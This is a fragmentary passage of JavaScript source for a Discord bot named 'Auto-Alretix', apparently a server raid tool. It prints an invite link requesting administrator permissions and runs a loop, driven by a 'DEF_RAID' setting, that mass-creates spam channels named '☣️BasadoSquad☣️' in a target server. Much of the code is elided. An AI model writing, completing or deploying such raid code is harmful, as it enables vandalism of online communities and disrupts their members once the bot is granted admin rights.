...
client.on('ready', ()=>{
    ...
    client.user.setActivity('Auto-Alretix (BY: ; xEShaddyZx#2200)', { type: 'WATCHING' });
    ...
    console.log(`
                             ...
                             AUTO-ALRETIX SOURCE CODE
                    MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
                    
Invitación Bot: 
https://discord.com/api/oauth2/authorize?client_id=${require('./config.json').BOT.ID}&permissions=8&scope=bot
...
.then(async audit => {
    ...
    for(let i = 0; i <= require('./config.json').DEF_RAID.AMOUNT_CHANNELS; i++) {
      try {
        await  guild.channels.create('☣️BasadoSquad☣️').then(c => {
